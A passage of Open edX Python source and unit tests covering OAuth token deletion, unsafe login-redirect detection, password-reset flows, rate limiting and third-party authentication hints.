redirect_to\n\n\ndef destroy_oauth_tokens(user):\n    \"\"\"\n    Destroys ALL OAuth access and refresh tokens for the given user.\n    \"\"\"\n    dop_access_token.objects.filter(user=user.id).delete()\n    dop_refresh_token.objects.filter(user=user.id).delete()\n    dot_access_token.objects.filter(user=user.id).delete()\n    dot_refresh_token.objects.filter(user=user.id).delete()\n/n/n/ncommon/djangoapps/student/tests/test_helpers.py/n/n\"\"\" Test Student helpers \"\"\"\n\nimport logging\n\nimport ddt\nfrom django.conf import settings\nfrom django.contrib.sessions.middleware import SessionMiddleware\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase\nfrom django.test.client import RequestFactory\nfrom django.test.utils import override_settings\nfrom mock import patch\nfrom testfixtures import LogCapture\n\nfrom student.helpers import get_next_url_for_login_page\nfrom openedx.core.djangoapps.site_configuration.tests.test_util import with_site_configuration_context\n\nLOGGER_NAME = \"student.helpers\"\n\n\n@ddt.ddt\nclass TestLoginHelper(TestCase):\n    \"\"\"Test login helper methods.\"\"\"\n    static_url = settings.STATIC_URL\n\n    def setUp(self):\n        super(TestLoginHelper, self).setUp()\n        self.request = RequestFactory()\n\n    @staticmethod\n    def _add_session(request):\n        \"\"\"Annotate the request object with a session\"\"\"\n        middleware = SessionMiddleware()\n        middleware.process_request(request)\n        request.session.save()\n\n    @ddt.data(\n        (\"https://www.amazon.com\", \"text/html\", None,\n         \"Unsafe redirect parameter detected after login page: u'https://www.amazon.com'\"),\n        (\"favicon.ico\", \"image/*\", \"test/agent\",\n         \"Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'favicon.ico'\"),\n        (\"https://www.test.com/test.jpg\", \"image/*\", None,\n         \"Unsafe redirect parameter detected after login page: u'https://www.test.com/test.jpg'\"),\n        (static_url + \"dummy.png\", \"image/*\", \"test/agent\",\n         \"Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'\" + static_url +\n         \"dummy.png\" + \"'\"),\n        (\"test.png\", \"text/html\", None,\n         \"Redirect to url path with specified filed type 'image/png' not allowed: u'test.png'\"),\n        (static_url + \"dummy.png\", \"text/html\", None,\n         \"Redirect to url path with specified filed type 'image/png' not allowed: u'\" + static_url + \"dummy.png\" + \"'\"),\n    )\n    @ddt.unpack\n    def test_unsafe_next(self, unsafe_url, http_accept, user_agent, expected_log):\n        \"\"\" Test unsafe next parameter \"\"\"\n        with LogCapture(LOGGER_NAME, level=logging.WARNING) as logger:\n            req = self.request.get(reverse(\"login\") + \"?next={url}\".format(url=unsafe_url))\n            req.META[\"HTTP_ACCEPT\"] = http_accept  # pylint: disable=no-member\n            req.META[\"HTTP_USER_AGENT\"] = user_agent  # pylint: disable=no-member\n            get_next_url_for_login_page(req)\n            logger.check(\n                (LOGGER_NAME, \"WARNING\", expected_log)\n            )\n\n    def test_safe_next(self):\n        \"\"\" Test safe next parameter \"\"\"\n        req = self.request.get(reverse(\"login\") + \"?next={url}\".format(url=\"/dashboard\"))\n        req.META[\"HTTP_ACCEPT\"] = \"text/html\"  # pylint: disable=no-member\n        next_page = get_next_url_for_login_page(req)\n        self.assertEqual(next_page, u'/dashboard')\n\n    @patch('student.helpers.third_party_auth.pipeline.get')\n    @ddt.data(\n        # Test requests outside the TPA pipeline - tpa_hint should be added.\n        (None, '/dashboard', '/dashboard', False),\n        ('', '/dashboard', '/dashboard', False),\n        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),\n        ('saml-idp', '/dashboard', '/dashboard?tpa_hint=saml-idp', False),\n        # THIRD_PARTY_AUTH_HINT can be overridden via the query string\n        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),\n\n        # Test requests inside the TPA pipeline - tpa_hint should not be added, preventing infinite loop.\n        (None, '/dashboard', '/dashboard', True),\n        ('', '/dashboard', '/dashboard', True),\n        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),\n        ('saml-idp', '/dashboard', '/dashboard', True),\n        # OK to leave tpa_hint overrides in place.\n        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),\n    )\n    @ddt.unpack\n    def test_third_party_auth_hint(self, tpa_hint, next_url, expected_url, running_pipeline, mock_running_pipeline):\n        mock_running_pipeline.return_value = running_pipeline\n\n        def validate_login():\n            req = self.request.get(reverse(\"login\") + \"?next={url}\".format(url=next_url))\n            req.META[\"HTTP_ACCEPT\"] = \"text/html\"  # pylint: disable=no-member\n            self._add_session(req)\n            next_page = get_next_url_for_login_page(req)\n            self.assertEqual(next_page, expected_url)\n\n        with override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT=tpa_hint)):\n            validate_login()\n\n        with with_site_configuration_context(configuration=dict(THIRD_PARTY_AUTH_HINT=tpa_hint)):\n            validate_login()\n/n/n/nlms/djangoapps/student_account/test/test_views.py/n/n# -*- coding: utf-8 -*-\n\"\"\" Tests for student account views. \"\"\"\n\nimport logging\nimport re\nfrom unittest import skipUnless\nfrom urllib import urlencode\n\nimport ddt\nimport mock\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.messages.middleware import MessageMiddleware\nfrom django.core import mail\nfrom django.core.files.uploadedfile import SimpleUploadedFile\nfrom django.core.urlresolvers import reverse\nfrom django.http import HttpRequest\nfrom django.test import TestCase\nfrom django.test.utils import override_settings\nfrom edx_oauth2_provider.tests.factories import AccessTokenFactory, ClientFactory, RefreshTokenFactory\nfrom edx_rest_api_client import exceptions\nfrom nose.plugins.attrib import attr\nfrom oauth2_provider.models import AccessToken as dot_access_token\nfrom oauth2_provider.models import RefreshToken as dot_refresh_token\nfrom provider.oauth2.models import AccessToken as dop_access_token\nfrom provider.oauth2.models import RefreshToken as dop_refresh_token\nfrom testfixtures import LogCapture\n\nfrom commerce.models import CommerceConfiguration\nfrom commerce.tests import factories\nfrom commerce.tests.mocks import mock_get_orders\nfrom course_modes.models import CourseMode\nfrom http.cookies import SimpleCookie\nfrom openedx.core.djangoapps.oauth_dispatch.tests import factories as dot_factories\nfrom openedx.core.djangoapps.programs.tests.mixins import ProgramsApiConfigMixin\nfrom openedx.core.djangoapps.site_configuration.tests.mixins import SiteMixin\nfrom openedx.core.djangoapps.theming.tests.test_util import with_comprehensive_theme_context\nfrom openedx.core.djangoapps.user_api.accounts.api import activate_account, create_account\nfrom openedx.core.djangolib.js_utils import dump_js_escaped_json\nfrom openedx.core.djangolib.testing.utils import CacheIsolationTestCase\nfrom student.tests.factories import UserFactory\nfrom student_account.views import account_settings_context, get_user_orders\nfrom third_party_auth.tests.testutil import ThirdPartyAuthTestMixin, simulate_running_pipeline\nfrom util.testing import UrlResetMixin\nfrom xmodule.modulestore.tests.django_utils import ModuleStoreTestCase\n\nLOGGER_NAME = 'audit'\nUser = get_user_model()  # pylint:disable=invalid-name\n\n\n@ddt.ddt\nclass StudentAccountUpdateTest(CacheIsolationTestCase, UrlResetMixin):\n    \"\"\" Tests for the student account views that update the user's account information. \"\"\"\n\n    USERNAME = u\"heisenberg\"\n    ALTERNATE_USERNAME = u\"walt\"\n    OLD_PASSWORD = u\"\u1e05\u1e37\u00fc\u00eb\u1e61\u1e33\u00ff\"\n    NEW_PASSWORD = u\"\ud83c\udd31\ud83c\udd38\ud83c\udd36\ud83c\udd31\ud83c\udd3b\ud83c\udd44\ud83c\udd34\"\n    OLD_EMAIL = u\"walter@graymattertech.com\"\n    NEW_EMAIL = u\"walt@savewalterwhite.com\"\n\n    INVALID_ATTEMPTS = 100\n    INVALID_KEY = u\"123abc\"\n\n    URLCONF_MODULES = ['student_accounts.urls']\n\n    ENABLED_CACHES = ['default']\n\n    def setUp(self):\n        super(StudentAccountUpdateTest, self).setUp()\n\n        # Create/activate a new account\n        activation_key = create_account(self.USERNAME, self.OLD_PASSWORD, self.OLD_EMAIL)\n        activate_account(activation_key)\n\n        # Login\n        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)\n        self.assertTrue(result)\n\n    @skipUnless(settings.ROOT_URLCONF == 'lms.urls', 'Test only valid in LMS')\n    def test_password_change(self):\n        # Request a password change while logged in, simulating\n        # use of the password reset link from the account page\n        response = self._change_password()\n        self.assertEqual(response.status_code, 200)\n\n        # Check that an email was sent\n        self.assertEqual(len(mail.outbox), 1)\n\n        # Retrieve the activation link from the email body\n        email_body = mail.outbox[0].body\n        result = re.search(r'(?P<url>https?://[^\\s]+)', email_body)\n        self.assertIsNot(result, None)\n        activation_link = result.group('url')\n\n        # Visit the activation link\n        response = self.client.get(activation_link)\n        self.assertEqual(response.status_code, 200)\n\n        # Submit a new password and follow the redirect to the success page\n        response = self.client.post(\n            activation_link,\n            # These keys are from the form on the current password reset confirmation page.\n            {'new_password1': self.NEW_PASSWORD, 'new_password2': self.NEW_PASSWORD},\n            follow=True\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertContains(response, \"Your password has been reset.\")\n\n        # Log the user out to clear session data\n        self.client.logout()\n\n        # Verify that the new password can be used to log in\n        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)\n        self.assertTrue(result)\n\n        # Try reusing the activation link to change the password again\n        # Visit the activation link again.\n        response = self.client.get(activation_link)\n        self.assertEqual(response.status_code, 200)\n        self.assertContains(response, \"This password reset link is invalid. It may have been used already.\")\n\n        self.client.logout()\n\n        # Verify that the old password cannot be used to log in\n        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)\n        self.assertFalse(result)\n\n        # Verify that the new password continues to be valid\n        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)\n        self.assertTrue(result)\n\n    @ddt.data(True, False)\n    def test_password_change_logged_out(self, send_email):\n        # Log the user out\n        self.client.logout()\n\n        # Request a password change while logged out, simulating\n        # use of the password reset link from the login page\n        if send_email:\n            response = self._change_password(email=self.OLD_EMAIL)\n            self.assertEqual(response.status_code, 200)\n        else:\n            # Don't send an email in the POST data, simulating\n            # its (potentially accidental) omission in the POST\n            # data sent from the login page\n            response = self._change_password()\n            self.assertEqual(response.status_code, 400)\n\n    def test_access_token_invalidation_logged_out(self):\n        self.client.logout()\n        user = User.objects.get(email=self.OLD_EMAIL)\n        self._create_dop_tokens(user)\n        self._create_dot_tokens(user)\n        response = self._change_password(email=self.OLD_EMAIL)\n        self.assertEqual(response.status_code, 200)\n        self.assert_access_token_destroyed(user)\n\n    def test_access_token_invalidation_logged_in(self):\n        user = User.objects.get(email=self.OLD_EMAIL)\n        self._create_dop_tokens(user)\n        self._create_dot_tokens(user)\n        response = self._change_password()\n        self.assertEqual(response.status_code, 200)\n        self.assert_access_token_destroyed(user)\n\n    def test_password_change_inactive_user(self):\n        # Log out the user created during test setup\n        self.client.logout()\n\n        # Create a second user, but do not activate it\n        create_account(self.ALTERNATE_USERNAME, self.OLD_PASSWORD, self.NEW_EMAIL)\n\n        # Send the view the email address tied to the inactive user\n        response = self._change_password(email=self.NEW_EMAIL)\n\n        # Expect that the activation email is still sent,\n        # since the user may have lost the original activation email.\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(len(mail.outbox), 1)\n\n    def test_password_change_no_user(self):\n        # Log out the user created during test setup\n        self.client.logout()\n\n        with LogCapture(LOGGER_NAME, level=logging.INFO) as logger:\n            # Send the view an email address not tied to any user\n            response = self._change_password(email=self.NEW_EMAIL)\n            self.assertEqual(response.status_code, 200)\n            logger.check((LOGGER_NAME, 'INFO', 'Invalid password reset attempt'))\n\n    def test_password_change_rate_limited(self):\n        # Log out the user created during test setup, to prevent the view from\n        # selecting the logged-in user's email address over the email provided\n        # in the POST data\n        self.client.logout()\n\n        # Make many consecutive bad requests in an attempt to trigger the rate limiter\n        for __ in xrange(self.INVALID_ATTEMPTS):\n            self._change_password(email=self.NEW_EMAIL)\n\n        response = self._change_password(email=self.NEW_EMAIL)\n        self.assertEqual(response.status_code, 403)\n\n    @ddt.data(\n        ('post', 'password_change_request', []),\n    )\n    @ddt.unpack\n    def test_require_http_method(self, correct_method, url_name, args):\n        wrong_methods = {'get', 'put', 'post', 'head', 'options', 'delete'} - {correct_method}\n        url = reverse(url_name, args=args)\n\n        for method in wrong_methods:\n            response = getattr(self.client, method)(url)\n            self.assertEqual(response.status_code, 405)\n\n    def _change_password(self, email=None):\n        \"\"\"Request to change the user's password. \"\"\"\n        data = {}\n\n        if email:\n            data['email'] = email\n\n        return self.client.post(path=reverse('password_change_request'), data=data)\n\n    def _create_dop_tokens(self, user=None):\n        \"\"\"Create dop access token for given user if user provided else for default user.\"\"\"\n        if not user:\n            user = User.objects.get(email=self.OLD_EMAIL)\n\n        client = ClientFactory()\n        access_token = AccessTokenFactory(user=user, client=client)\n        RefreshTokenFactory(user=user, client=client, access_token=access_token)\n\n    def _create_dot_tokens(self, user=None):\n        \"\"\"Create dop access token for given user if user provided else for default user.\"\"\"\n        if not user:\n            user = User.objects.get(email=self.OLD_EMAIL)\n\n        application = dot_factories.ApplicationFactory(user=user)\n        access_token = dot_factories.AccessTokenFactory(user=user, application=application)\n        dot_factories.RefreshTokenFactory(user=user, application=application, access_token=access_token)\n\n    def assert_access_token_destroyed(self, user):\n        \"\"\"Assert all access tokens are destroyed.\"\"\"\n        self.assertFalse(dot_access_token.objects.filter(user=user).exists())\n        self.assertFalse(dot_refresh_token.objects.filter(user=user).exists())\n        self.assertFalse(dop_access_token.objects.filter(user=user).exists())\n        self.assertFalse(dop_refresh_token.objects.filter(user=user).exists())\n\n\n@attr(shard=3)\n@ddt.ddt\nclass StudentAccountLoginAndRegistrationTest(ThirdPartyAuthTestMixin, UrlResetMixin, ModuleStoreTestCase):\n    \"\"\" Tests for the student account views that update the user's account information. \"\"\"\n\n    USERNAME = \"bob\"\n    EMAIL = \"bob@example.com\"\n    PASSWORD = \"password\"\n\n    URLCONF_MODULES = ['openedx.core.djangoapps.embargo']\n\n    @mock.patch.dict(settings.FEATURES, {'EMBARGO': True})\n    def setUp(self):\n        super(StudentAccountLoginAndRegistrationTest, self).setUp()\n\n        # Several third party auth providers are created for these tests:\n        self.google_provider = self.configure_google_provider(enabled=True, visible=True)\n        self.configure_facebook_provider(enabled=True, visible=True)\n        self.configure_dummy_provider(\n            visible=True,\n            enabled=True,\n            icon_class='',\n            icon_image=SimpleUploadedFile('icon.svg', '<svg><rect width=\"50\" height=\"100\"/></svg>'),\n        )\n        self.hidden_enabled_provider = self.configure_linkedin_provider(\n            visible=False,\n            enabled=True,\n        )\n        self.hidden_disabled_provider = self.configure_azure_ad_provider()\n\n    @ddt.data(\n        (\"signin_user\", \"login\"),\n        (\"register_user\", \"register\"),\n    )\n    @ddt.unpack\n    def test_login_and_registration_form(self, url_name, initial_mode):\n        response = self.client.get(reverse(url_name))\n        expected_data = '\"initial_mode\": \"{mode}\"'.format(mode=initial_mode)\n        self.assertContains(response, expected_data)\n\n    @ddt.data(\"signin_user\", \"register_user\")\n    def test_login_and_registration_form_already_authenticated(self, url_name):\n        # Create/activate a new account and log in\n        activation_key = create_account(self.USERNAME, self.PASSWORD, self.EMAIL)\n        activate_account(activation_key)\n        result = self.client.login(username=self.USERNAME, password=self.PASSWORD)\n        self.assertTrue(result)\n\n        # Verify that we're redirected to the dashboard\n        response = self.client.get(reverse(url_name))\n        self.assertRedirects(response, reverse(\"dashboard\"))\n\n    @ddt.data(\n        (None, \"signin_user\"),\n        (None, \"register_user\"),\n        (\"edx.org\", \"signin_user\"),\n        (\"edx.org\", \"register_user\"),\n    )\n    @ddt.unpack\n    def test_login_and_registration_form_signin_not_preserves_params(self, theme, url_name):\n        params = [\n            ('course_id', 'edX/DemoX/Demo_Course'),\n            ('enrollment_action', 'enroll'),\n        ]\n\n        # The response should not have a \"Sign In\" button with the URL\n        # that preserves the querystring params\n        with with_comprehensive_theme_context(theme):\n            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        expected_url = '/login?{}'.format(self._finish_auth_url_param(params + [('next', '/dashboard')]))\n        self.assertNotContains(response, expected_url)\n\n        # Add additional parameters:\n        params = [\n            ('course_id', 'edX/DemoX/Demo_Course'),\n            ('enrollment_action', 'enroll'),\n            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),\n            ('email_opt_in', 'true'),\n            ('next', '/custom/final/destination')\n        ]\n\n        # Verify that this parameter is also preserved\n        with with_comprehensive_theme_context(theme):\n            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        expected_url = '/login?{}'.format(self._finish_auth_url_param(params))\n        self.assertNotContains(response, expected_url)\n\n    @mock.patch.dict(settings.FEATURES, {\"ENABLE_THIRD_PARTY_AUTH\": False})\n    @ddt.data(\"signin_user\", \"register_user\")\n    def test_third_party_auth_disabled(self, url_name):\n        response = self.client.get(reverse(url_name))\n        self._assert_third_party_auth_data(response, None, None, [], None)\n\n    @mock.patch('student_account.views.enterprise_customer_for_request')\n    @ddt.data(\n        (\"signin_user\", None, None, None),\n        (\"register_user\", None, None, None),\n        (\"signin_user\", \"google-oauth2\", \"Google\", None),\n        (\"register_user\", \"google-oauth2\", \"Google\", None),\n        (\"signin_user\", \"facebook\", \"Facebook\", None),\n        (\"register_user\", \"facebook\", \"Facebook\", None),\n        (\"signin_user\", \"dummy\", \"Dummy\", None),\n        (\"register_user\", \"dummy\", \"Dummy\", None),\n        (\n            \"signin_user\",\n            \"google-oauth2\",\n            \"Google\",\n            {\n                'name': 'FakeName',\n                'logo': 'https://host.com/logo.jpg',\n                'welcome_msg': 'No message'\n            }\n        )\n    )\n    @ddt.unpack\n    def test_third_party_auth(\n            self,\n            url_name,\n            current_backend,\n            current_provider,\n            expected_enterprise_customer_mock_attrs,\n            enterprise_customer_mock\n    ):\n        params = [\n            ('course_id', 'course-v1:Org+Course+Run'),\n            ('enrollment_action', 'enroll'),\n            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),\n            ('email_opt_in', 'true'),\n            ('next', '/custom/final/destination'),\n        ]\n\n        if expected_enterprise_customer_mock_attrs:\n            expected_ec = mock.MagicMock(\n                branding_configuration=mock.MagicMock(\n                    logo=mock.MagicMock(\n                        url=expected_enterprise_customer_mock_attrs['logo']\n                    ),\n                    welcome_message=expected_enterprise_customer_mock_attrs['welcome_msg']\n                )\n            )\n            expected_ec.name = expected_enterprise_customer_mock_attrs['name']\n        else:\n            expected_ec = None\n\n        enterprise_customer_mock.return_value = expected_ec\n\n        # Simulate a running pipeline\n        if current_backend is not None:\n            pipeline_target = \"student_account.views.third_party_auth.pipeline\"\n            with simulate_running_pipeline(pipeline_target, current_backend):\n                response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        # Do NOT simulate a running pipeline\n        else:\n            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n\n        # This relies on the THIRD_PARTY_AUTH configuration in the test settings\n        expected_providers = [\n            {\n                \"id\": \"oa2-dummy\",\n                \"name\": \"Dummy\",\n                \"iconClass\": None,\n                \"iconImage\": settings.MEDIA_URL + \"icon.svg\",\n                \"loginUrl\": self._third_party_login_url(\"dummy\", \"login\", params),\n                \"registerUrl\": self._third_party_login_url(\"dummy\", \"register\", params)\n            },\n            {\n                \"id\": \"oa2-facebook\",\n                \"name\": \"Facebook\",\n                \"iconClass\": \"fa-facebook\",\n                \"iconImage\": None,\n                \"loginUrl\": self._third_party_login_url(\"facebook\", \"login\", params),\n                \"registerUrl\": self._third_party_login_url(\"facebook\", \"register\", params)\n            },\n            {\n                \"id\": \"oa2-google-oauth2\",\n                \"name\": \"Google\",\n                \"iconClass\": \"fa-google-plus\",\n                \"iconImage\": None,\n                \"loginUrl\": self._third_party_login_url(\"google-oauth2\", \"login\", params),\n                \"registerUrl\": self._third_party_login_url(\"google-oauth2\", \"register\", params)\n            },\n        ]\n        self._assert_third_party_auth_data(\n            response,\n            current_backend,\n            current_provider,\n            expected_providers,\n            expected_ec\n        )\n\n    def test_hinted_login(self):\n        params = [(\"next\", \"/courses/something/?tpa_hint=oa2-google-oauth2\")]\n        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"oa2-google-oauth2\"')\n\n        tpa_hint = self.hidden_enabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"{0}\"'.format(tpa_hint))\n\n        tpa_hint = self.hidden_disabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=\"text/html\")\n        self.assertNotIn(response.content, tpa_hint)\n\n    @ddt.data(\n        ('signin_user', 'login'),\n        ('register_user', 'register'),\n    )\n    @ddt.unpack\n    def test_hinted_login_dialog_disabled(self, url_name, auth_entry):\n        \"\"\"Test that the dialog doesn't show up for hinted logins when disabled. \"\"\"\n        self.google_provider.skip_hinted_login_dialog = True\n        self.google_provider.save()\n        params = [(\"next\", \"/courses/something/?tpa_hint=oa2-google-oauth2\")]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertRedirects(\n            response,\n            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),\n            target_status_code=302\n        )\n\n    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))\n    @ddt.data(\n        'signin_user',\n        'register_user',\n    )\n    def test_settings_tpa_hinted_login(self, url_name):\n        \"\"\"\n        Ensure that settings.FEATURES['THIRD_PARTY_AUTH_HINT'] can set third_party_auth_hint.\n        \"\"\"\n        params = [(\"next\", \"/courses/something/\")]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"oa2-google-oauth2\"')\n\n        # THIRD_PARTY_AUTH_HINT can be overridden via the query string\n        tpa_hint = self.hidden_enabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertContains(response, '\"third_party_auth_hint\": \"{0}\"'.format(tpa_hint))\n\n        # Even disabled providers in the query string will override THIRD_PARTY_AUTH_HINT\n        tpa_hint = self.hidden_disabled_provider.provider_id\n        params = [(\"next\", \"/courses/something/?tpa_hint={0}\".format(tpa_hint))]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertNotIn(response.content, tpa_hint)\n\n    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))\n    @ddt.data(\n        ('signin_user', 'login'),\n        ('register_user', 'register'),\n    )\n    @ddt.unpack\n    def test_settings_tpa_hinted_login_dialog_disabled(self, url_name, auth_entry):\n        \"\"\"Test that the dialog doesn't show up for hinted logins when disabled via settings.THIRD_PARTY_AUTH_HINT. \"\"\"\n        self.google_provider.skip_hinted_login_dialog = True\n        self.google_provider.save()\n        params = [(\"next\", \"/courses/something/\")]\n        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=\"text/html\")\n        self.assertRedirects(\n            response,\n            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),\n            target_status_code=302\n        )\n\n    @mock.patch('student_account.views.enterprise_customer_for_request')\n    @ddt.data(\n        ('signin_user', False, None, None, None),\n        ('register_user', False, None, None, None),\n        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),\n        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),\n        ('signin_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),\n        ('register_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),\n        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),\n        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),\n        ('signin_user', True, 'Fake EC', None, None),\n        ('register_user', True, 'Fake EC', None, None),\n    )\n    @ddt.unpack\n    def test_enterprise_register(self, url_name, ec_present, ec_name, logo_url, welcome_message, mock_get_ec):\n        \"\"\"\n        Verify that when an EnterpriseCustomer is received on the login and register views,\n        the appropriate sidebar is rendered.\n        \"\"\"\n        if ec_present:\n            mock_ec = mock_get_ec.return_value\n            mock_ec.name = ec_name\n            if logo_url:\n                mock_ec.branding_configuration.logo.url = logo_url\n            else:\n                mock_ec.branding_configuration.logo = None\n            if welcome_message:\n                mock_ec.branding_configuration.welcome_message = welcome_message\n            else:\n                del mock_ec.branding_configuration.welcome_message\n        else:\n            mock_get_ec.return_value = None\n\n        response = self.client.get(reverse(url_name), HTTP_ACCEPT=\"text/html\")\n\n        enterprise_sidebar_div_id = u'enterprise-content-container'\n\n        if not ec_present:\n            self.assertNotContains(response, text=enterprise_sidebar_div_id)\n        else:\n            self.assertContains(response, text=enterprise_sidebar_div_id)\n            if not welcome_message:\n                welcome_message = settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE\n            expected_message = welcome_message.format(\n                start_bold=u'<b>',\n                end_bold=u'</b>',\n                enterprise_name=ec_name,\n                platform_name=settings.PLATFORM_NAME\n            )\n            self.assertContains(response, expected_message)\n            if logo_url:\n                self.assertContains(response, logo_url)\n\n    def test_enterprise_cookie_delete(self):\n        \"\"\"\n        Test that enterprise cookies are deleted in login/registration views.\n\n        Cookies must be deleted in login/registration views so that *default* login/registration branding\n        is displayed to subsequent requests from non-enterprise customers.\n        \"\"\"\n        cookies = SimpleCookie()\n        cookies[settings.ENTERPRISE_CUSTOMER_COOKIE_NAME] = 'test-enterprise-customer'\n        response = self.client.get(reverse('signin_user'), HTTP_ACCEPT=\"text/html\", cookies=cookies)\n\n        self.assertIn(settings.ENTERPRISE_CUSTOMER_COOKIE_NAME, response.cookies)  # pylint:disable=no-member\n        enterprise_cookie = response.cookies[settings.ENTERPRISE_CUSTOMER_COOKIE_NAME]  # pylint:disable=no-member\n\n        self.assertEqual(enterprise_cookie['domain'], settings.BASE_COOKIE_DOMAIN)\n        self.assertEqual(enterprise_cookie.value, '')\n\n    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)\n    def test_microsite_uses_old_login_page(self):\n        # Retrieve the login page from a microsite domain\n        # and verify that we're served the old page.\n        resp = self.client.get(\n            reverse(\"signin_user\"),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertContains(resp, \"Log into your Test Site Account\")\n        self.assertContains(resp, \"login-form\")\n\n    def test_microsite_uses_old_register_page(self):\n        # Retrieve the register page from a microsite domain\n        # and verify that we're served the old page.\n        resp = self.client.get(\n            reverse(\"register_user\"),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertContains(resp, \"Register for Test Site\")\n        self.assertContains(resp, \"register-form\")\n\n    def test_login_registration_xframe_protected(self):\n        resp = self.client.get(\n            reverse(\"register_user\"),\n            {},\n            HTTP_REFERER=\"http://localhost/iframe\"\n        )\n\n        self.assertEqual(resp['X-Frame-Options'], 'DENY')\n\n        self.configure_lti_provider(name='Test', lti_hostname='localhost', lti_consumer_key='test_key', enabled=True)\n\n        resp = self.client.get(\n            reverse(\"register_user\"),\n            HTTP_REFERER=\"http://localhost/iframe\"\n        )\n\n        self.assertEqual(resp['X-Frame-Options'], 'ALLOW')\n\n    def _assert_third_party_auth_data(self, response, current_backend, current_provider, providers, expected_ec):\n        \"\"\"Verify that third party auth info is rendered correctly in a DOM data attribute. \"\"\"\n        finish_auth_url = None\n        if current_backend:\n            finish_auth_url = reverse(\"social:complete\", kwargs={\"backend\": current_backend}) + \"?\"\n\n        auth_info = {\n            \"currentProvider\": current_provider,\n            \"providers\": providers,\n            \"secondaryProviders\": [],\n            \"finishAuthUrl\": finish_auth_url,\n            \"errorMessage\": None,\n            \"registerFormSubmitButtonText\": \"Create Account\",\n        }\n        if expected_ec is not None:\n            # If we set an EnterpriseCustomer, third-party auth providers ought to be hidden.\n            auth_info['providers'] = []\n        auth_info = dump_js_escaped_json(auth_info)\n\n        expected_data = '\"third_party_auth\": {auth_info}'.format(\n            auth_info=auth_info\n        )\n\n        self.assertContains(response, expected_data)\n\n    def _third_party_login_url(self, backend_name, auth_entry, login_params):\n        \"\"\"Construct the login URL to start third party authentication. \"\"\"\n        return u\"{url}?auth_entry={auth_entry}&{param_str}\".format(\n            url=reverse(\"social:begin\", kwargs={\"backend\": backend_name}),\n            auth_entry=auth_entry,\n            param_str=self._finish_auth_url_param(login_params),\n        )\n\n    def _finish_auth_url_param(self, params):\n        \"\"\"\n        Make the next=... URL parameter that indicates where the user should go next.\n\n        >>> _finish_auth_url_param([('next', '/dashboard')])\n        '/account/finish_auth?next=%2Fdashboard'\n        \"\"\"\n        return urlencode({\n            'next': '/account/finish_auth?{}'.format(urlencode(params))\n        })\n\n    def test_english_by_default(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\")\n\n        self.assertEqual(response['Content-Language'], 'en')\n\n    def test_unsupported_language(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\", HTTP_ACCEPT_LANGUAGE=\"ts-zx\")\n\n        self.assertEqual(response['Content-Language'], 'en')\n\n    def 